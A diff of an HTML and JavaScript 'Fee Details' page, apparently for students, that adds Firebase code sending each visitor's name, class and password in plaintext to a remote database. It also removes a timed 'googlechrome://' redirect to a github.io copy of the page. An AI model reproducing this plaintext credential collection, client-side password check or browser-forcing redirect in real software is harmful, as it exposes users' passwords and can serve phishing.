@@ -39,7 +39,7 @@
             color: #fff;
             outline: none;
         }
-        .submit-button, .logout-button {
+        .submit-button {
             width: 100%;
             padding: 14px;
             border: none;
@@ -48,41 +48,42 @@
             font-weight: bold;
             cursor: pointer;
             margin-top: 10px;
-        }
-        .pay-button {
-  width: 100%;
-  padding: 14px;
-  background: #5ABC2D;
-  border: none;
-  border-radius: 10px;
-  font-size: 18px;
-  font-weight: bold;
-  cursor: pointer;
-  margin-top: 10px;
-}
-        .submit-button {
             background: linear-gradient(45deg, #ffcc00, #ff9900);
             color: #222;
         }
         .logout-button {
+            width: 30%;
+            padding: 10px;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
             background: red;
             color: white;
+        }
+        .pay-button {
+            width: 100%;
+            padding: 14px;
+            background: #5ABC2D;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <script>
-  setTimeout(function () {
-    window.location.href = "googlechrome://webset377.github.io/Your-Fee-Details-/";
-  }, 1000);
-    </script>
 
     <!-- Login Form -->
     <div class="container" id="login-container">
         <h1>Fee Details</h1>
         <p>अब आप अपनी डिजिटल फीस डिटेल्स देख सकते हैं!</p>
         <form id="loginForm">
-            <input class="input-field" id="username" type="text" placeholder="Enter your Name" required />
+            <input class="input-field" id="username" name="username" type="text" placeholder="Enter your Name" required />
             <input class="input-field" id="class1" type="number" placeholder="Enter your Class" required />
             <input class="input-field" id="password" type="password" placeholder="Set your Password" required />
             <button class="submit-button" type="submit">Get Details</button>
@@ -94,87 +95,92 @@
         <h1>Enter Password</h1>
         <p>Please enter your password to access the dashboard.</p>
         <input class="input-field" id="verify-password" type="password" placeholder="Enter your Password" required />
-        <button class="submit-button" onclick="verifyPassword()">See Details </button>
-        <button class="pay-button" onclick="ss()">Fee Pay</button>
-    </div>
-
-    <!-- Dashboard -->
-    <div class="container" id="dashboard-container" style="display: none;">
-        <h1>Welcome to Your Dashboard</h1>
-        <p id="user-info"></p>
+        <button class="submit-button" onclick="verifyPassword()">See Details</button>
+        <button class="pay-button" onclick="payFee()">Fee Pay</button>
         <button class="logout-button" onclick="logout()">Logout</button>
     </div>
-<script>
-    document.addEventListener("DOMContentLoaded", function () {
-        const username = localStorage.getItem("username");
-        const storedPassword = localStorage.getItem("password");
-        const userClass = localStorage.getItem("class1");
 
-        if (username && storedPassword && userClass) {
-            showPasswordPrompt();  // Agar data stored hai to password maangega
-        } else {
-            showLogin();  // Agar data nahi hai to login form show karega
+    <script type="module">
+        // Import Firebase SDK
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
+
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDkXPj_MdJKhi0VWXL7MHodqwuHdzTPxVE",
+            authDomain: "e-fee-ae5c8.firebaseapp.com",
+            databaseURL: "https://e-fee-ae5c8-default-rtdb.firebaseio.com",
+            projectId: "e-fee-ae5c8",
+            storageBucket: "e-fee-ae5c8.appspot.com",
+            messagingSenderId: "338161441627",
+            appId: "1:338161441627:web:89f259b4f3f02e067c987e",
+            measurementId: "G-ZE6HBDH2S3"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Function to store user data
+        function writeUserData(username, password, class1) {
+            const userId = new Date().getTime().toString(); // Unique user ID
+            set(ref(db, "users/" + userId), {
+                username: username,
+                password: password,
+                class1: class1
+            }).then(() => {
+                alert("✅ Your Fee Details successfully!");
+            }).catch((error) => {
+                console.error("❌ Error saving data:", error);
+                alert("❌ Failed to save data.");
+            });
         }
-    });
-    function ss(){
-    window.location = 'Fee_Pay.html'  
-    
-    }
 
-    function showLogin() {
-        document.getElementById("login-container").style.display = "block";
-        document.getElementById("password-container").style.display = "none";
-        document.getElementById("dashboard-container").style.display = "none";
-    }
+        // Handle form submission
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
 
-    function showPasswordPrompt() {
-        document.getElementById("login-container").style.display = "none";
-        document.getElementById("password-container").style.display = "block";
-        document.getElementById("dashboard-container").style.display = "none";
-    }
+            const username = document.getElementById("username").value;
+            const class1 = document.getElementById("class1").value;
+            const password = document.getElementById("password").value;
 
-    function showDashboard() {
-        const username = localStorage.getItem("username");
-        const userClass = localStorage.getItem("class1");
-        document.getElementById("user-info").innerText = `Hello, ${username}! You are in class ${userClass}.`;
-        document.getElementById("login-container").style.display = "none";
-        document.getElementById("password-container").style.display = "none";
-        document.getElementById("dashboard-container").style.display = "block";
-    }
+            if (username && password && class1) {
+                writeUserData(username, password, class1);
+                localStorage.setItem("username", username);
+                localStorage.setItem("class1", class1);
+                localStorage.setItem("password", password);
+                showPasswordPrompt();
+            } else {
+                alert("⚠️ Please fill in all fields.");
+            }
+        });
 
-    document.getElementById("loginForm").addEventListener("submit", function(event) {
-        event.preventDefault();
-        const username = document.getElementById("username").value;
-        const userClass = document.getElementById("class1").value;
-        const password = document.getElementById("password").value;
-
-        if (username && userClass && password) {
-            localStorage.setItem("username", username);
-            localStorage.setItem("class1", userClass);
-            localStorage.setItem("password", password);
-    
-        } else {
-            alert("⚠️ Please fill in all fields.");
+        function showPasswordPrompt() {
+            document.getElementById("login-container").style.display = "none";
+            document.getElementById("password-container").style.display = "block";
         }
-    });
 
-    function verifyPassword() {
-        const storedPassword = localStorage.getItem("password");
-        const enteredPassword = document.getElementById("verify-password").value;
+        function verifyPassword() {
+            const storedPassword = localStorage.getItem("password");
+            const enteredPassword = document.getElementById("verify-password").value;
 
-        if (storedPassword && enteredPassword === storedPassword) {
-            showDashboard();
-            window.location = 'Fee_Data.html'
-        } else {
-            alert("❌ Incorrect Password. Try again!");
+            if (storedPassword && enteredPassword === storedPassword) {
+                window.location = 'Fee_Data.html';
+            } else {
+                alert("❌ Incorrect Password. Try again!");
+            }
         }
-    }
 
-    function logout() {
-        localStorage.clear(); // Sare data ko remove karega
-        showLogin(); // Dobara login form dikhayega
-    }
-</script>
+        function payFee() {
+            window.location = 'Fee_Pay.html';
+        }
+
+        function logout() {
+            localStorage.clear();
+            document.getElementById("login-container").style.display = "block";
+            document.getElementById("password-container").style.display = "none";
+        }
+    </script>
 
 </body>
-</html>
+    </html>
